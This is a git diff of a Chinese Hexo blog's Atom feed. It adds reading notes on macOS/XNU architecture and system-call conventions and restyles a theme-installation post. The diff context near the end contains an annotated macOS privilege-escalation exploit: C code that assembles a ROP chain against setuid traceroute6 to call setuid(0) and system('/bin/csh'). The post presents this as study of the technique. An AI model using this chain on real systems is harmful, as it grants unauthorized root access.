+<h3 id="库"><a href="#库" class="headerlink" title="库"></a>库</h3><p>Mac 包含多套 API 可用。<br>包括:</p>
+<ol>
+<li>BSD api 方便移植 unix的代码库 (库 Api)</li>
+<li>Mach Trap（Mach　陷阱) OSX 特有的 Api</li>
+<li>框架 Api</li>
+</ol>
+<p>1-2　可以使用C/C++ 开发<br>3 框架Api 有些必须使用OC开发，比如cocoa, 有些框架可以使用C/C++开发,比如 Carbon</p>
+<p>一般框架代码会同时支持ｃocoa和Carbon, 比如,访问语音合成器的SpeechSynthesis.Framework框架同时位于 ApplicationServices框架（Carbon,C/C++实现）和AppKit（对于Coacoa, OC实现）</p>
+<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>OSX 的特殊之处在 OSX 的系统调用提供了２套调用接口。</p>
+<ul>
+<li>POSIX 调用</li>
+<li>mach 调用</li>
+</ul>
+<ol>
+<li>POSIX 调用</li>
+</ol>
+<p>这是一套　编程标准，专门负责定义API声明（具体到参数类型，格式，返回值，函数名等等）。<br>当前的POSIX主要分为四个部分：<a href="https://zh.wikipedia.org/wiki/POSIX" target="_blank" rel="external">Base Definitions、System Interfaces、Shell and Utilities和Rationale</a></p>
+<p>OSX提供的系统调用，在 <strong>系统调用原型</strong>继承了POSIX标准，但是 <strong>系统编号</strong>OSX和标准的编号不同。<br>在 unistd.h　定义了系统调用原型。</p>
+<p>如果系统调用原型和系统编号都一样，那么就可以在多台机型上移植二进制程序（机型必须要支持对应的二进制格式，OSX不支持ELF格式）<br>BSD 层对 mach做了一次封装。</p>
+<blockquote>
+<p>当前的BSD操作系统变种支持各种通用标准，包括IEEE、ANSI、ISO以及POSIX，同时保持传统BSD的良好风范。</p>
+</blockquote>
+<ol>
+<li>mach接口<br>32位，mach系统调用号　是负数, POSIX 的系统调用号时　非负数，所以２者共存。<br>64位，mach系统调用号　从0x2000000 开头，POSIX以　0x1000000　开头。</li>
+</ol>
+<p>总结BSD和mach的系统调用：<br>32位libSystem.B.dylib库,32位系统调用的指令是 sysenter, 负责系统调用的函数是 __sysenter_trap。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">// mach系统调用</div><div class="line">movl  $0xffffffe5 , %eax        ；系统调用号（负数，　有符号)</div><div class="line">call __sysenter_trap                ；</div><div class="line"></div><div class="line">__sysenter_trap:</div><div class="line">pop %edx</div><div class="line">movl  %esp, %ecx</div><div class="line">sysenter　                   ；执行　系统调用　指令</div><div class="line">nopl (%eax)</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">// BSD 系统调用</div><div class="line">movl  $0x000c0010, %eax   ; 系统调用号（非负）</div><div class="line">call  0x00000dd8        ;跳转到 __sysenter_trap </div><div class="line">jae  0x0005d36a         ;</div><div class="line">...</div></pre></td></tr></table></figure>
+<p>64 位系统调用的指令是 syscall<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//  mach系统调用</div><div class="line">movq  %rcx, %r10</div><div class="line">movl  %0x0100001a, %eax         ;系统调用号</div><div class="line">syscall             ;</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//  BSD系统调用</div><div class="line">movl  $0x02000010, %eax</div><div class="line">movq  %rcx, %r10</div><div class="line">syscall         ;</div></pre></td></tr></table></figure>
+<p>发现不管是32位还是64位除了系统调用号不同，其他的地方没有区别（寄存器使用　和　系统调用命令）</p>
+<p>系统调用指令　systenter　具体干什么事？</p>
+<h3 id="XNU"><a href="#XNU" class="headerlink" title="XNU"></a>XNU</h3><p>xnu　是一个混合内核，xnu由以下几部分构成：</p>
+<ul>
+<li>Mach微内核</li>
+<li>BSD 层</li>
+<li>libKern</li>
+<li>I/O Kit</li>
+</ul>
+<p>同时　内核允许动态加载　扩展插件（Kernel Extension , KExt)</p>
+<h4 id="Mach"><a href="#Mach" class="headerlink" title="Mach　"></a>Mach　</h4><p>提供了　系统的基本职责，　但是　Mach本身的Api很少。</p>
+<ul>
+<li>进程和线程的抽象</li>
+<li>虚拟内存</li>
+<li>任务调度</li>
+<li>IPC 和　消息传递的机制</li>
+</ul>
+<h4 id="BSD"><a href="#BSD" class="headerlink" title="BSD"></a>BSD</h4><p>这一层是对Mach　的封装，并且兼容POSIX 标准。包括的内容：</p>
+<ul>
+<li>UNIX　进程模型</li>
+<li>POSIX 线程模型 (Pthread)，　同步原语</li>
+<li>UNIX 用户和用户组</li>
+<li>网络协议栈</li>
+<li>文件系统访问</li>
+<li>设备访问　（/dev　下的驱动设备)</li>
+</ul>
+<h4 id="libkern"><a href="#libkern" class="headerlink" title="libkern"></a>libkern</h4><p>I/O Kit驱动程序　使用C++语言编写。　libkern　库负责提供C++运行时需要的基类。<br>libkern　是自包含的C++库，提供了C++特性，继承，重载，</p>
+<h4 id="I-O-kit"><a href="#I-O-kit" class="headerlink" title="I/O kit"></a>I/O kit</h4><p>I/O Kit　本身就是一套自包含的系统。</p>
+<h3 id="个人总结"><a href="#个人总结" class="headerlink" title="个人总结"></a>个人总结</h3><p>第二章结束了，对OSX 和iOS 的 <strong>架构</strong>和 <strong>关键组件</strong>有了基本认识。同时 对本书的结构有了大体的掌握。<br>通过分析上面２点已知的内容，可以快速定位　需要的知识，帮助完成突发的工作需求。</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>第一部分（1-7章）</th>
+<th>第二部分（8-19章）</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>描述 1</td>
+<td>分散的知识点</td>
+<td>系统的知识</td>
+</tr>
+<tr>
+<td>描述 2</td>
+<td>Apple系统的特色，比如:安全防护技术(3)，Mach-O　可执行格式(4)，引导过程(6)。</td>
+<td>内核特性。</td>
+</tr>
+<tr>
+<td>描述 3</td>
+<td>还有操作系统中　重要且必备的模块，比如: 进程，调试，启动进程init/Launchd。</td>
+<td>主要介绍构成　XNU 的４个部分。<strong>目前的重点　放在第二部分，重点放在　理解XNU　各部分的代码实现</strong></td>
+</tr>
+</tbody>
+</table>
+<p>学习的顺序，时间安排，记录的标准。这三个指标需要　动态调整。<br>注意：　记录重要的代码　位置，功能，函数<br><img src="/include/img/bk-xnu/kernel.png" alt="xmind"></p>
+<p>Todo:</p>
+<pre><code>1. 从xnu开源代码中梳理出这４个部分
+</code></pre><h3 id="Change-Log"><a href="#Change-Log" class="headerlink" title="Change Log"></a>Change Log</h3><table>
+<thead>
+<tr>
+<th>Time</th>
+<th>Change</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2017-3-13</td>
+<td>2.7 节</td>
+</tr>
+<tr>
+<td>2017-03-14</td>
+<td>第二章　结束</td>
+</tr>
+<tr>
+<td>2017-03-14</td>
+<td>制定 xnu 学习计划</td>
+</tr>
+</tbody>
+</table>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+    
+    </summary>
+    
+      <category term="读书" scheme="http://yoursite.com/categories/%E8%AF%BB%E4%B9%A6/"/>
+    
+    
+  </entry>
+  
+  <entry>
     <title>简洁主题--Maupassant</title>
     <link href="http://yoursite.com/2017/03/09/%E7%AE%80%E6%B4%81%E4%B8%BB%E9%A2%98-Maupassant/"/>
     <id>http://yoursite.com/2017/03/09/简洁主题-Maupassant/</id>
     <published>2017-03-09T15:26:42.000Z</published>
-    <updated>2017-03-09T16:45:55.000Z</updated>
+    <updated>2017-03-09T16:47:25.000Z</updated>
     
     <content type="html"><![CDATA[<p>转载自：<a href="https://www.haomwei.com/technology/maupassant-hexo.html#文章摘要" target="_blank" rel="external">https://www.haomwei.com/technology/maupassant-hexo.html#文章摘要</a></p>
 <hr>
@@ -35,7 +420,7 @@
 </ul>
 <p>不过由icylogic最初移植的版本只保留了主题最基本的模块，跟Cho自己发布的Farbox版类似，无法满足大部分爱折腾的Hexoer的需要。因此，在这半年的使用过程中，我将icylogic的源码fork过来，陆陆续续添加了一些想要的功能，目前能够实现的功能已经跟当初Typecho平台上的版本差不多了。</p>
 <p>我已经将修改后的代码发布在Github上，有兴趣的朋友可以下载试用，并欢迎反馈问题：</p>
-<h3 id="主题安装"><a href="#主题安装" class="headerlink" title="主题安装"></a>主题安装</h3><p>安装主题和渲染器：<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$ </span>git clone <span class="symbol">https:</span>/<span class="regexp">/github.com/tufu</span>9441/maupassant-hexo.git themes/maupassant</div><div class="line"><span class="variable">$ </span>npm install hexo-renderer-jade --save</div><div class="line"><span class="variable">$ </span>npm install hexo-renderer-sass --save</div></pre></td></tr></table></figure></p>
+<h3 id="主题安装"><a href="#主题安装" class="headerlink" title="主题安装"></a>主题安装</h3><p>安装主题和渲染器：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ git clone https://github.com/tufu9441/maupassant-hexo.git themes/maupassant</div><div class="line">$ npm install hexo-renderer-jade --save</div><div class="line">$ npm install hexo-renderer-sass --save</div></pre></td></tr></table></figure></p>
 <p>编辑Hexo目录下的 _config.yml，将theme的值改为maupassant。</p>
 <p>注：若npm install hexo-renderer-sass安装时报错，可能是国内网络问题，请尝试使用代理或者切换至<a href="http://npm.taobao.org/" target="_blank" rel="external">淘宝NPM镜像</a>安装，感谢光头强提供的方法。</p>
 <h3 id="功能配置"><a href="#功能配置" class="headerlink" title="功能配置"></a>功能配置</h3><figure class="highlight c"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">fancybox: <span class="literal">true</span> ## If you want to use fancybox please <span class="built_in">set</span> the value to <span class="literal">true</span>.</div><div class="line">duoshuo: ## Your duoshuo_shortname, e.g. username</div><div class="line">disqus: ## Your disqus_shortname, e.g. username</div><div class="line">google_search: <span class="literal">true</span> ## Use Google search, <span class="literal">true</span>/<span class="literal">false</span>.</div><div class="line">baidu_search: ## Use Baidu search, <span class="literal">true</span>/<span class="literal">false</span>.</div><div class="line">swiftype: ## Your swiftype_key, e.g. m7b11ZrsT8Me7gzApciT</div><div class="line">tinysou: ## Your tinysou_key, e.g. <span class="number">4</span>ac092ad8d749fdc6293</div><div class="line">self_search: ## Use a jQuery-based local search engine, <span class="literal">true</span>/<span class="literal">false</span>.</div><div class="line">google_analytics: ## Your Google Analytics tracking id, e.g. UA<span class="number">-42425684</span><span class="number">-2</span></div><div class="line">baidu_analytics: ## Your Baidu Analytics tracking id, e.g. <span class="number">8006843039519956000</span></div><div class="line">show_category_count: <span class="literal">false</span> ## If you want to show the count of categories in the sidebar widget please <span class="built_in">set</span> the value to <span class="literal">true</span>.</div><div class="line">shareto: <span class="literal">true</span> ## If you want to use the share button please <span class="built_in">set</span> the value to <span class="literal">true</span>.</div><div class="line">busuanzi: <span class="literal">true</span> ## If you want to use Busuanzi page views please <span class="built_in">set</span> the value to <span class="literal">true</span>.</div><div class="line">widgets_on_small_screens: <span class="literal">false</span> ## Set to <span class="literal">true</span> to enable widgets on small screens.</div><div class="line">menu:</div><div class="line">  - page: home</div><div class="line">    directory: .</div><div class="line">    icon: fa-home</div><div class="line">  - page: archive</div><div class="line">    directory: archives/</div><div class="line">    icon: fa-archive</div><div class="line">  - page: about</div><div class="line">    directory: about/</div><div class="line">    icon: fa-user</div><div class="line">  - page: rss</div><div class="line">    directory: atom.xml</div><div class="line">    icon: fa-rss</div><div class="line">widgets: ## Six widgets in sidebar provided: search, category, tag, recent_posts, rencent_comments and links.</div><div class="line">  - search</div><div class="line">  - category</div><div class="line">  - tag</div><div class="line">  - recent_posts</div><div class="line">  - recent_comments</div><div class="line">  - links</div><div class="line">links:</div><div class="line">  - title: site-name1</div><div class="line">    url: http:<span class="comment">//www.example1.com/</span></div><div class="line">  - title: site-name2</div><div class="line">    url: http:<span class="comment">//www.example2.com/</span></div><div class="line">  - title: site-name3</div><div class="line">    url: http:<span class="comment">//www.example3.com/</span></div><div class="line"></div><div class="line">timeline:</div><div class="line">  - num: <span class="number">1</span></div><div class="line">    word: <span class="number">2014</span>/<span class="number">06</span>/<span class="number">12</span>-Start</div><div class="line">  - num: <span class="number">2</span></div><div class="line">    word: <span class="number">2014</span>/<span class="number">11</span>/<span class="number">29</span>-XXX</div><div class="line">  - num: <span class="number">3</span></div><div class="line">    word: <span class="number">2015</span>/<span class="number">02</span>/<span class="number">18</span>-DDD</div><div class="line">  - num: <span class="number">4</span></div><div class="line">    word: More</div><div class="line"></div><div class="line"># Static files</div><div class="line">js: js</div><div class="line">css: css</div><div class="line"># Theme version</div><div class="line">version: <span class="number">0.0</span><span class="number">.0</span></div></pre></td></tr></table></figure>
@@ -69,9 +454,9 @@
 <h4 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h4><p>在文章的front-matter中添加toc: true即可让该篇文章显示目录。</p>
 <h4 id="文章评论"><a href="#文章评论" class="headerlink" title="文章评论"></a>文章评论</h4><p>文章和页面的评论功能可以通过在front-matter中设置comments: true或comments: false来进行开启或关闭（默认开启）。</p>
 <p>注意：如果没有出现 多说评论框，很有可能是登录多说帐号失败。请打开浏览器调试窗口查看请求是否成功。</p>
-<h4 id="语法高亮"><a href="#语法高亮" class="headerlink" title="语法高亮"></a>语法高亮</h4><p>要启用代码高亮，请在Hexo目录的_config.yml中将highlight选项按照如下设置：<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="attr">highlight:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  auto_detect:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  line_number:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  tab_replace:</span></div></pre></td></tr></table></figure></p>
+<h4 id="语法高亮"><a href="#语法高亮" class="headerlink" title="语法高亮"></a>语法高亮</h4><p>要启用代码高亮，请在Hexo目录的_config.yml中将highlight选项按照如下设置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">highlight:</div><div class="line">  enable: true</div><div class="line">  auto_detect: true</div><div class="line">  line_number: true</div><div class="line">  tab_replace:</div></pre></td></tr></table></figure></p>
 <h4 id="数学公式"><a href="#数学公式" class="headerlink" title="数学公式"></a>数学公式</h4><p>要启用数学公式支持，请在Hexo目录的_config.yml中添加：</p>
-<p><code>mathjax: true</code><br>并在相应文章的front-matter中添加<code>mathjax: true</code>，例如：<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="attr">title:</span> Test Math</div><div class="line"><span class="attr">date:</span> <span class="number">2016</span><span class="bullet">-04</span><span class="bullet">-05</span> <span class="number">14</span>:<span class="number">16</span>:<span class="number">00</span></div><div class="line"><span class="attr">categories:</span> math</div><div class="line"><span class="attr">mathjax:</span> <span class="literal">true</span></div><div class="line"><span class="meta">---</span></div></pre></td></tr></table></figure></p>
+<p><code>mathjax: true</code><br>并在相应文章的front-matter中添加<code>mathjax: true</code>，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">title: Test Math</div><div class="line">date: 2016-04-05 14:16:00</div><div class="line">categories: math</div><div class="line">mathjax: true</div><div class="line">---</div></pre></td></tr></table></figure></p>
 <h4 id="支持语言"><a href="#支持语言" class="headerlink" title="支持语言"></a>支持语言</h4><p>目前支持简体中文（zh-CN），繁体中文（zh-TW），英语（en），法语（fr-FR），德语（de-DE），韩语（ko）和西班牙语（es-ES），欢迎翻译至其它语言。</p>
 ]]></content>
     
@@ -171,9 +556,9 @@ fptr_offset : __cleanup 相对 fptr_page 的偏移
 </code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">char</span>** <span class="title">setup_payload_and_offsets</span><span class="params">(<span class="keyword">uint64_t</span>* stack_shift, <span class="keyword">uint64_t</span>* fptr_page, <span class="keyword">uint32_t</span>* fptr_offset)</span> </span>&#123;</div><div class="line"></div><div class="line">   <span class="comment">// &amp;__cleanup: __DATA 段中 __cleanup 的地址</span></div><div class="line">   <span class="comment">// __cleanup : 是 libsystem_c.dylib 中对应函数的地址</span></div><div class="line">  *fptr_page = (<span class="keyword">uint64_t</span>)((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)(&amp;__cleanup) &amp; ~(<span class="number">0xfff</span>ULL));        [<span class="number">0</span>] 代码段内存共享，所以各个进程中__cleanup地址都一样</div><div class="line">  *fptr_offset = ((<span class="keyword">uint64_t</span>)(&amp;__cleanup)) - *fptr_page;</div><div class="line"></div><div class="line">  <span class="comment">//[1] 搜索 ret 指令</span></div><div class="line">  <span class="keyword">uint8_t</span>* ret = (<span class="keyword">uint8_t</span>*)&amp;<span class="built_in">strcpy</span>; <span class="comment">// the start of libsystem_c</span></div><div class="line">  <span class="keyword">do</span> &#123;</div><div class="line">    ret += <span class="number">1</span>;</div><div class="line">    ret = memmem(ret, <span class="number">0x1000000</span>, <span class="string">"\xc3"</span>, <span class="number">1</span>);   <span class="comment">//search 'ret'</span></div><div class="line">  &#125; <span class="keyword">while</span> (ret != <span class="literal">NULL</span> &amp;&amp; ((count_nulls((<span class="keyword">uint64_t</span>)ret)) != <span class="number">2</span>) );</div><div class="line">..</div><div class="line">  <span class="comment">//[2]. pop rdi; ret gadget</span></div><div class="line">  <span class="keyword">uint8_t</span>* pop_rdi_ret = memmem(&amp;<span class="built_in">strcpy</span>, <span class="number">0x1000000</span>, <span class="string">"\x5f\xc3"</span>, <span class="number">2</span>);</div><div class="line">  <span class="keyword">if</span> (pop_rdi_ret == <span class="literal">NULL</span>) &#123;</div><div class="line">    FAIL(<span class="string">"couldn't find pop rdi; ret gadget\n"</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="comment">//[3]. /bin/sh string:</span></div><div class="line">  <span class="keyword">void</span>* bin_sh = ((<span class="keyword">char</span>*)__cleanup)-(<span class="number">1024</span>*<span class="number">1024</span>); <span class="comment">// start from 1MB below this symbol in libsystem_c.dylib</span></div><div class="line">  bin_sh = memmem(bin_sh, <span class="number">2</span>*<span class="number">1024</span>*<span class="number">1024</span>, <span class="string">"/bin/csh"</span>, <span class="number">9</span>);</div><div class="line">  <span class="keyword">if</span> (bin_sh == <span class="literal">NULL</span>) &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"couldn't find /bin/sh string\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">  &#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//[4]. 搜索 修改 rsp 的 gadget</span></div><div class="line"></div><div class="line"><span class="keyword">uint8_t</span>* stack_shift_gadget = memmem(&amp;realpath, <span class="number">0x4000</span>, <span class="string">"\x48\x81\xc4"</span>, <span class="number">3</span>);</div><div class="line">  <span class="keyword">if</span> (stack_shift == <span class="literal">NULL</span>) &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"couldn't find stack shift\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">  &#125;</div><div class="line"></div><div class="line"><span class="comment">// libsystem_c.dylib`realpath$DARWIN_EXTSN:</span></div><div class="line"><span class="comment">// 0x7fffa333ab47 &lt;+1908&gt;: addq   $0x1d98, %rsp             ; imm = 0x1D98</span></div><div class="line"><span class="comment">// 0x7fffa333ab4e &lt;+1915&gt;: popq   %rbx</span></div><div class="line"><span class="comment">// 0x7fffa333ab4f &lt;+1916&gt;: popq   %r12</span></div><div class="line"><span class="comment">// 0x7fffa333ab51 &lt;+1918&gt;: popq   %r13</span></div><div class="line"><span class="comment">// 0x7fffa333ab53 &lt;+1920&gt;: popq   %r14</span></div><div class="line"><span class="comment">// 0x7fffa333ab55 &lt;+1922&gt;: popq   %r15</span></div><div class="line"><span class="comment">// 0x7fffa333ab57 &lt;+1924&gt;: popq   %rbp</span></div><div class="line"><span class="comment">// 0x7fffa333ab58 &lt;+1925&gt;: retq</span></div><div class="line"></div><div class="line">  <span class="comment">//获取 add rsp 的立即数</span></div><div class="line">  <span class="keyword">uint32_t</span> realpath_shift_amount = *(<span class="keyword">uint32_t</span>*)(stack_shift_gadget+<span class="number">3</span>);  <span class="comment">//0x1d98 </span></div><div class="line"></div><div class="line">  <span class="comment">// 这里预测 traceroute6 的栈大小</span></div><div class="line">  <span class="keyword">uint32_t</span> traceroute6_stack_size = <span class="number">0x948</span>;</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (realpath_shift_amount - <span class="number">0x200</span> &lt; traceroute6_stack_size) &#123;</div><div class="line">    <span class="comment">//add rsp, xxx  这个值不够大，无法跳转到 argv 区</span></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"that stack shift gadget probably isn't big enough...\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">  &#125;</div><div class="line">    </div><div class="line">  *stack_shift = (<span class="keyword">uint64_t</span>)stack_shift_gadget;</div><div class="line"></div><div class="line"><span class="keyword">int</span> ret_slide_length = ((realpath_shift_amount - traceroute6_stack_size) / <span class="number">8</span> / <span class="number">5</span>) * <span class="number">2</span>;</div><div class="line"></div><div class="line"></div><div class="line">  <span class="keyword">char</span>* progname = <span class="string">"/usr/sbi"</span> <span class="comment">//8</span></div><div class="line">                   <span class="string">"n/tracer"</span> <span class="comment">//8</span></div><div class="line">                   <span class="string">"oute6"</span>;   <span class="comment">//6</span></div><div class="line">  <span class="keyword">char</span>* optname  = <span class="string">"-w"</span>;      <span class="comment">//3</span></div><div class="line">  <span class="keyword">char</span>* optval   = <span class="string">"LOLLLL"</span>;  <span class="comment">//7</span></div><div class="line"></div><div class="line"><span class="comment">// 这里 『+6』 是因为 ret slide 后面 还有 pop_rdi_ret 到&amp;system 6条指令。</span></div><div class="line">  <span class="keyword">size_t</span> target_argv_rop_size = (ret_slide_length + <span class="number">6</span>)* <span class="number">8</span>; <span class="comment">// ret slides plus slots for the actual rop</span></div><div class="line"></div><div class="line">  <span class="keyword">uint8_t</span>** args_u64 = <span class="built_in">malloc</span>(target_argv_rop_size + <span class="number">1</span>); <span class="comment">// plus extra NULL byte at the end</span></div><div class="line">  <span class="keyword">char</span>* args = (<span class="keyword">char</span>*)args_u64;</div><div class="line">  <span class="built_in">memset</span>(args, <span class="number">0</span>, target_argv_rop_size + <span class="number">1</span>);</div><div class="line"></div><div class="line">  <span class="comment">// ret-slide  写入堆中</span></div><div class="line">  <span class="keyword">int</span> i;</div><div class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ret_slide_length; i++) &#123;</div><div class="line">    args_u64[i] = ret;</div><div class="line">  &#125;</div><div class="line">【<span class="number">0</span>】 提权的 shellcode</div><div class="line">  args_u64[i] = pop_rdi_ret;</div><div class="line">  args_u64[i+<span class="number">1</span>] = <span class="number">0</span>;</div><div class="line">  args_u64[i+<span class="number">2</span>] = (<span class="keyword">uint8_t</span>*)&amp;setuid;</div><div class="line">  args_u64[i+<span class="number">3</span>] = pop_rdi_ret;</div><div class="line">  args_u64[i+<span class="number">4</span>] = bin_sh;</div><div class="line">  args_u64[i+<span class="number">5</span>] = (<span class="keyword">uint8_t</span>*)&amp;system;</div><div class="line"></div><div class="line">  <span class="comment">// allocate worst-case size</span></div><div class="line">   <span class="comment">// malloc 足够大的空间来保存 shellcode </span></div><div class="line">  <span class="keyword">size_t</span> argv_allocation_size = (ret_slide_length+<span class="number">100</span>)*<span class="number">8</span>*<span class="number">8</span>;</div><div class="line">  <span class="keyword">char</span>** target_argv = <span class="built_in">malloc</span>(argv_allocation_size);</div><div class="line">  <span class="built_in">memset</span>(target_argv, <span class="number">0</span>, argv_allocation_size);</div><div class="line"><span class="comment">// 【1】 设置启动参数 /usr/sbin/traceroute6 -w  LOLLLL</span></div><div class="line">  target_argv[<span class="number">0</span>] = progname;</div><div class="line">  target_argv[<span class="number">1</span>] = optname;</div><div class="line">  target_argv[<span class="number">2</span>] = optval;</div><div class="line">  <span class="keyword">int</span> argn = <span class="number">3</span>;</div><div class="line"></div><div class="line">  <span class="comment">//【2】将 ret 数组的地址写入到 argv 中</span></div><div class="line">  target_argv[argn++] = &amp;args[<span class="number">0</span>];</div><div class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; target_argv_rop_size; i++) &#123;</div><div class="line">    <span class="keyword">if</span> (args[i<span class="number">-1</span>] == <span class="number">0</span>) &#123;</div><div class="line">      target_argv[argn++] = &amp;args[i];</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  target_argv[argn] = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line">  <span class="keyword">return</span> target_argv;</div></pre></td></tr></table></figure>
